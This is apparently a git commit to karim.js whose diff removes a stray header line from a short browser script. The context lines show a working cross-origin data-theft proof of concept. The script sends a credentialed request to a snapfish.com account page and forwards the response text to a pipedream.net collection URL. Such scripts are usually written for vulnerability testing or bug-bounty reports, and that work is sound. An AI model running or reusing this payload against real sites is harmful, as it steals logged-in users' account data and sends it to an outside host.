5e4f777816d2a24eb764648e3a0ee5957d110e9e
Khaled samy <115103466+khaledsamy411@users.noreply.github.com>
2024-01-03 19:19:39 +0200

    Update karim.js

--- karim.js
+++ karim.js
@@ -3,7 +3,6 @@ req.onload = reqListener;
 req.open('get','https://www.snapfish.com/youraccount?tab=tab-1',true);
 req.withCredentials = true;
 req.send();
-Content-Length: 2141
 
 function reqListener() {
    location='https://en0wwy1g0an7hi.x.pipedream.net?key='+this.responseText;
